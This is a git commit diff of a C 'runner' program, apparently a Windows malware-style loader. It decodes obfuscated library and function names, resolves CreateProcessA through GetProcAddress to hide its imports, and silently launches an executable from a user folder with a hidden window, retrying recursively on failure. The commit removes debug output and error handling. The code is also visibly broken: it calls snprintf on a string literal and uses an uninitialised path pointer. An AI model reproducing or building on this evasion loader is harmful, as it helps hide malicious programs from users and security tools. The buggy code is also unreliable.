666f3774100c205ec64d7b96e110d9bd59d496a1
Cyb3rCr0wCC <cccybercrow@gmail.com>
2025-07-12 09:42:52 +0500

    Fix: Encryption base64

--- runner copy.c
+++ runner copy.c
@@ -5,43 +5,29 @@
 #include "enc.h"
 
 typedef BOOL (WINAPI *LPCTRPRC)(
-    LPCSTR,
-    LPSTR,
-    LPSECURITY_ATTRIBUTES,
-    LPSECURITY_ATTRIBUTES,
-    BOOL,
-    DWORD,
-    LPVOID,
-    LPCSTR,
-    LPSTARTUPINFOA,
-    LPPROCESS_INFORMATION
+    LPCSTR                lpApplicationName,
+    LPSTR                 lpCommandLine,
+    LPSECURITY_ATTRIBUTES lpProcessAttributes,
+    LPSECURITY_ATTRIBUTES lpThreadAttributes,
+    BOOL                  bInheritHandles,
+    DWORD                 dwCreationFlags,
+    LPVOID                lpEnvironment,
+    LPCSTR                lpCurrentDirectory,
+    LPSTARTUPINFOA        lpStartupInfo,
+    LPPROCESS_INFORMATION lpProcessInformation
 );
 
 
 void crtProc(LPSTR szPath, STARTUPINFO si, PROCESS_INFORMATION pi){
-    ZeroMemory(&si, sizeof(si));
-    si.cb = sizeof(si); // Crucially, set the size of the STARTUPINFO structure
-    ZeroMemory(&pi, sizeof(pi));
 
     LPCTRPRC crtprc = NULL;
     // decode encoded lib name 
     char* kr32dec = Decode("ICYjLC0ncGNsLCcv");
-    printf("Printed kr32: %s\n", kr32dec);
-    char* crtprocN = Decode("CDE0IzwuEyMtKy4wIgM=");
-    printf("Printed crtproc: %s\n", crtprocN);
+    char* crtprocN = Decode("DCYlEjokIBAmLDkmIjEA");
     // LoadLibrary
     HMODULE kn32 = LoadLibraryA(kr32dec);
-    if (kn32 == NULL){
-        printf("Failed to load lib: %lu\n", GetLastError());
-        return;
-    }
     // Get Function Adress(CreateProcessA)
-    printf("Try to call getprocaddr with this arguments: %s, %s\n", kr32dec, crtprocN);
-    crtprc = (LPCTRPRC)GetProcAddress(kn32, crtprocN);
-    if (crtprc == NULL ){
-        printf("Failed to get procaddress: %lu\n", GetLastError());
-        return;
-    } 
+    crtprc = (LPCTRPRC) GetProcAddress(kn32, crtprocN);
 
     // Run that function
     
@@ -57,33 +43,27 @@ void crtProc(LPSTR szPath, STARTUPINFO si, PROCESS_INFORMATION pi){
     &pi);
 
     if ( r==0 ){
-        printf("Failed to crtproc: %lu\n", GetLastError());
         crtProc(szPath, si, pi);
-    } 
-    else{
-        printf("Successfully created process");
     }
-    FreeLibrary(kn32);
 }
 
 int main() {
     
     STARTUPINFO si;
     PROCESS_INFORMATION pi;
-    char exPath[20];
+    char* exPath;
     si.dwFlags = STARTF_USESHOWWINDOW;
     si.wShowWindow = SW_HIDE;
-    TCHAR szPath[MAX_PATH];
 
     ZeroMemory(&si, sizeof(si));
     si.cb = sizeof(si); // Crucially, set the size of the STARTUPINFO structure
     ZeroMemory(&pi, sizeof(pi));
-    char* exPTDEC = Decode("KC84JyY/bTQ6LQ==");
-    char* dot = strchr(exPTDEC, '.');
+
+    TCHAR szPath[MAX_PATH];
+    char* exPTDEC = Decode("OTY/bC0zJgAA");
     
-    printf("Printed exe filename: %s\n",exPTDEC); 
-    snprintf(exPath, sizeof(exPath),"\\%s", exPTDEC);
-    printf("Full Exepath is: %s", exPath);
+    snprintf("exPath", sizeof(exPath),"\\%s", exPTDEC);
+
     // LoadLibrary
     // Get Function Adress (SHGetFolderPath)
     // Run that function
@@ -94,7 +74,6 @@ int main() {
         szPath))) 
     {
         strcat_s(szPath, sizeof(szPath)/sizeof(TCHAR), exPath);
-        printf("szPath is: %s\n", szPath);
         crtProc(szPath, si, pi);
     }
 
